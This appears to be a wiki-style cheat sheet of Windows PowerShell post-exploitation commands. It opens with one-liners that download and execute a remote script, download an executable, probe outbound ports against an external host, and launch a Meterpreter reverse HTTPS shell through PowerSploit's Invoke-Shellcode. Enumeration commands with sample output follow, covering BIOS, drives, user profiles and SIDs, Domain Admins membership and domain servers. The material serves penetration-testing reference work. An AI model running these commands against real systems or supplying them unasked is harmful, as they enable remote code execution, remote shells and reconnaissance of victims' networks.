<!-- Code for collapse and expand -->
<script type="text/javascript"> 
$(document).ready(function() { 
$('div.view').hide(); 
$('div.slide').click(function() {
$(this).next('div.view').slideToggle('fast'); 
return false; 
}); 
}); 
</script>

# Windows Powershell Commands and Scripts for Post Exploitation

# One liners

**Download and Execute Remote Powershell Script**

```
iex (New-Object Net.WebClient).DownloadString("http://host/file.txt")
```

**Download and Save File**

```
(new-object System.Net.WebClient).Downloadfile('http://host/file.exe', 'file.exe')
```

**Enumerate Allowed Outbound Ports 1-1024 via [securitypadawan.blogspot.com](http://securitypadawan.blogspot.com/2013/04/quickly-determine-allowed-outbound-ports.html)**

```
$ErrorActionPreference = "silentlycontinue"; 1..1024 | % {$req = [System.Net.WebRequest]::Create("http://letmeoutofyour.net:$_"); $req.Timeout = 600; $resp = $req.GetResponse(); $respstream = $resp.GetResponseStream(); 
$stream = new-object System.IO.StreamReader $respstream; $out = $stream.ReadToEnd(); if ($out.trim() -eq "w00tw00t"){echo "$_ Allowed out"}}
```

**Reverse Shell Using [PowerSploit's Invoke-Shellcode](https://github.com/mattifestation/PowerSploit/blob/master/CodeExecution/Invoke-Shellcode.ps1)**

```
Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost 192.168.1.10 -Lport 443 -Force
```

----

# Commands with Sample Output
## Hardware
### Get BIOS Information
 * **Command with arguments**: `gwmi win32_bios`
 * **Description**: Retrieves BIOS information including system serial number.
 * **Output**:
   * <div class="slide" style="cursor: pointer;"> **Windows 7:** Show/Hide</div><div class="view"><code>PS C:\Users\johndoe> gwmi win32_bios<br>SMBIOSBIOSVersion : 6.00<br>Manufacturer      : Phoenix Technologies LTD<br>Name              : PhoenixBIOS 4.0 Release 6.0<br>SerialNumber      : VMware-56 4d 9b 0f 26 ba 8c f9-6e 7a 1e 33 5d 3c f0 dc<br>Version           : INTEL  - 6040000</code></div> 
   
### Get Drive Information
 * **Command with arguments**: `[System.IO.DriveInfo]::GetDrives()`
 * **Output**:
   * <div class="slide" style="cursor: pointer;"> **Windows 7:** Show/Hide</div><div class="view"><code>PS C:\Users\johndoe> [System.IO.DriveInfo]::GetDrives()<br><br>Name               : C:\<br>DriveType          : Fixed<br>DriveFormat        : NTFS<br>IsReady            : True<br>AvailableFreeSpace : 55568087552<br>TotalFreeSpace     : 55568087552<br>TotalSize          : 159876850304<br>RootDirectory      : C:\<br>VolumeLabel        : <br><br>Name               : D:\<br>DriveType          : CDRom<br>DriveFormat        : <br>IsReady            : False<br>AvailableFreeSpace : <br>TotalFreeSpace     : <br>TotalSize          : <br>RootDirectory      : D:\<br>VolumeLabel        : <br><br>Name               : G:\<br>DriveType          : Removable<br>DriveFormat        : <br>IsReady            : False<br>AvailableFreeSpace : <br>TotalFreeSpace     : <br>TotalSize          : <br>RootDirectory      : G:\<br>VolumeLabel        : <br><br>Name               : V:\<br>DriveType          : Network<br>DriveFormat        : NTFS<br>IsReady            : True<br>AvailableFreeSpace : 259182640616<br>TotalFreeSpace     : 259182640616<br>TotalSize          : 827361812256<br>RootDirectory      : V:\<br>VolumeLabel        : TestMappedDrive</code></div> 

## User Information
### Display Username, SID, Last Used
 * **Command with arguments**: `gwmi win32_userprofile | select -unique @{name="Name";expression={$_.__server}},@{name="SID";expression={$_.sid}},@{name="LastUseTime";expression={$_.converttodatetime($_.lastusetime)}},localpath | ft -auto`
 * **Description**: Retrieves information about system users.
 * **Output**:
   * <div class="slide" style="cursor: pointer;"> **Windows 7:** Show/Hide</div><div class="view"><code>PS C:\Users\johndoe> gwmi win32\_userprofile | select -unique @{name="Name";expression={$\_.\_\_server}},@{name="SID";expressi<br>on={$\_.sid}},@{name="LastUseTime";expression={$\_.converttodatetime($\_.lastusetime)}},localpath | ft -auto<br><br>Name&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;SID&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;LastUseTime&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;localpath<br>----&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;---&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-----------&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;---------<br>WIN-244VDGE5OGH&nbsp;S-1-5-21-1319606305-3131390644-2280705280-1000&nbsp;4/13/2012&nbsp;7:52:02&nbsp;PM&nbsp;C:\Users\johndoe<br>WIN-244VDGE5OGH&nbsp;S-1-5-20&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;C:\Windows\ServiceProfiles\Netwo...<br>WIN-244VDGE5OGH&nbsp;S-1-5-19&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;C:\Windows\ServiceProfiles\Local...<br>WIN-244VDGE5OGH&nbsp;S-1-5-18&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;C:\Windows\system32\config\syste...</code></div> 
   
### Translate SID to Username
 * **Command with arguments**: `((New-Object System.Security.Principal.SecurityIdentifier("S-1-5-19")).translate([System.Security.Principal.NTAccount])).value`
 * **Output**:
   * <div class="slide" style="cursor: pointer;"> **Windows 7:** Show/Hide</div><div class="view"><code>PS C:\Users\johndoe> ((New-Object System.Security.Principal.SecurityIdentifier("S-1-5-21-1319606305-3131390644-2280705280-<br>1000")).translate([System.Security.Principal.NTAccount])).value<br>WIN-244VDGE5OGH\johndoe</code></div> 
   
 ## Using the PowerShell Active Directory Modules
 ### Via https://www.trustedsec.com/uncategorized/powershell-reconnaissance/
 ### Setting Credentials 
 * **Command with arguments**: `$cred = Get-Credential`
 * **Description**: Stores valid credentials in the $cred variable for use with the Active Directory Modules.
 * **Notes**: These following commands require the Powershell Active Directory Modules to be installed. Steps to install for Win7 are detailed [here] (http://blogs.msdn.com/b/rkramesh/archive/2012/01/17/how-to-add-active-directory-module-in-powershell-in-windows-7.aspx) 
   
 ### Query to List "Domain Admins" 
 * **Command with arguments**: `Get-ADGroupMember -Credential $cred -server pwnt.com "Domain Admins"`
 * **Output**:
   * <div class="slide" style="cursor: pointer;"> **Windows 7:** Show/Hide</div><div class="view"><code>distinguishedName : CN=Administrator,CN=Users,DC=pwnt,DC=com<br>name              : Administrator<br>objectClass       : user<br>objectGUID        : 1fd60ff8-07a4-4c6e-9a1e-7cd0d7bb97db<br>SamAccountName    : Administrator<br>SID               : S-1-5-21-2027135834-1792351174-2509185371-500</code></div> 
   
 ### Enumerate All Servers on Domain 
 * **Command with arguments**: `Get-ADComputer -Credential $cred -server pwnt.com -LDAPFilter "(&(objectCategory=computer)(opera
tingSystem=*Server*))" |select name`
 * **Output**:
   * <div class="slide" style="cursor: pointer;"> **Windows 7:** Show/Hide</div><div class="view"><code>name<br>----<br>PWNT-DC<br>
Exchange1<br>
SharePoint1</code></div>


### Get Info About All Connected Drives
 * **Command with arguments**: `[System.IO.DriveInfo]::GetDrives()`
 * **Output**:
   * <div class="slide" style="cursor: pointer;"> **Windows 7:** Show/Hide</div><div class="view"><code>
	Name : C:\
	DriveType : Fixed
	DriveFormat : NTFS
	IsReady : True
	AvailableFreeSpace : 111111111111
	TotalFreeSpace : 111111111111
	TotalSize : 111111111111
	RootDirectory : C:\
	VolumeLabel : HP
	<br />
	Name : D:\
	DriveType : Fixed
	DriveFormat : NTFS
	IsReady : True
	AvailableFreeSpace : 111111111111
	TotalFreeSpace : 111111111111
	TotalSize : 111111111111
	RootDirectory : D:\
	VolumeLabel : DATA
	<br />
	Name : E:\
	DriveType : CDRom
	DriveFormat :
	IsReady : False
	AvailableFreeSpace :
	TotalFreeSpace :
	TotalSize :
	RootDirectory : E:\
	VolumeLabel :
    </code></div>

### Obtain detailed information about a running process or service
 * **Command with arguments**: `gps | ?{$_.name -match "<process/service name>"} | ?{$_.id -match "<process/service id>"} | select *`
 * **Output**:
   * <div class="slide" style="cursor: pointer;"> **Windows 7:** Show/Hide</div><div class="view"><code>
	__NounName                 : Process
	Name                       : firefox
	Handles                    : 383
	VM                         : 272830464
	WS                         : 90185728
	PM                         : 69402624
	NPM                        : 24676
	Path                       : C:\Program Files\Mozilla Firefox\firefox.exe
	Company                    : Mozilla Corporation
	CPU                        : 2.1684139
	FileVersion                : 26.0
	ProductVersion             : 26.0
	Description                : Firefox
	Product                    : Firefox
	Id                         : 3176
	PriorityClass              : Normal
	HandleCount                : 383
	WorkingSet                 : 90185728
	PagedMemorySize            : 69402624
	PrivateMemorySize          : 69402624
	VirtualMemorySize          : 272830464
	TotalProcessorTime         : 00:00:02.1684139
	BasePriority               : 8
	ExitCode                   :
	HasExited                  : False
	ExitTime                   :
	Handle                     : 1904
	MachineName                : .
	MainWindowHandle           : 131426
	MainWindowTitle            : Mozilla Firefox Start Page - Mozilla Firefox
	MainModule                 : System.Diagnostics.ProcessModule (firefox.exe)
	MaxWorkingSet              : 1413120
	MinWorkingSet              : 204800
	Modules                    : {System.Diagnostics.ProcessModule (firefox.exe), System.Diagnostics.ProcessModule (ntdll.d
		                     ll), System.Diagnostics.ProcessModule (kernel32.dll), System.Diagnostics.ProcessModule (KE
		                     RNELBASE.dll)...}
	NonpagedSystemMemorySize   : 24676
	NonpagedSystemMemorySize64 : 24676
	PagedMemorySize64          : 69402624
	PagedSystemMemorySize      : 277804
	PagedSystemMemorySize64    : 277804
	PeakPagedMemorySize        : 77041664
	PeakPagedMemorySize64      : 77041664
	PeakWorkingSet             : 97169408
	PeakWorkingSet64           : 97169408
	PeakVirtualMemorySize      : 281219072
	PeakVirtualMemorySize64    : 281219072
	PriorityBoostEnabled       : True
	PrivateMemorySize64        : 69402624
	PrivilegedProcessorTime    : 00:00:00.4992032
	ProcessName                : firefox
	ProcessorAffinity          : 1
	Responding                 : True
	SessionId                  : 1
	StartInfo                  : System.Diagnostics.ProcessStartInfo
	StartTime                  : 1/29/2014 8:02:12 PM
	SynchronizingObject        :
	Threads                    : {2664, 772, 3160, 544...}
	UserProcessorTime          : 00:00:01.6692107
	VirtualMemorySize64        : 272830464
	EnableRaisingEvents        : False
	StandardInput              :
	StandardOutput             :
	StandardError              :
	WorkingSet64               : 90185728
	Site                       :
	Container                  :
</code></div>

### Translate SID to username
 * **Command with arguments**: `((New-Object System.Security.Principal.SecurityIdentifier("<ssid>")).translate([System.Security.Principal.NTAccount])).value`
 * **Output**:
   * <div class="slide" style="cursor: pointer;"> **Windows 7:** Show/Hide</div><div class="view"><code>
        NT AUTHORITY\SELF
   </code></div>

### Grab each user on the local system and list their last login time, their SSID and their user path.
 * **Command with arguments**: `gwmi win32_userprofile | select -unique @{name="Name";expression={$_.__server}},@{name="SID";expression={$_.sid}},@{name="LastUseTime";expression={$_.converttodatetime($_.lastusetime)}},localpath | ft -auto`
 * **Output**:
 * <div class="slide" style="cursor: pointer;"> **Windows 7:** Show/Hide</div><div class="view"><code>
WIN-C77DTCDJS11 S-1-5-xx-xxxxxxxxxx-xxxxxxxxxx-xxxxxxxxxx-xxxx x/xx/2014 x:xx:xx PM C:\Users\xxxx
WIN-C77DTCDJS11 S-1-5-20                                                            C:\Windows\ServiceProfiles\Netwo...
WIN-C77DTCDJS11 S-1-5-19                                                            C:\Windows\ServiceProfiles\Local...
WIN-C77DTCDJS11 S-1-5-18                                                            C:\Windows\system32\config\syste...
</code></div>
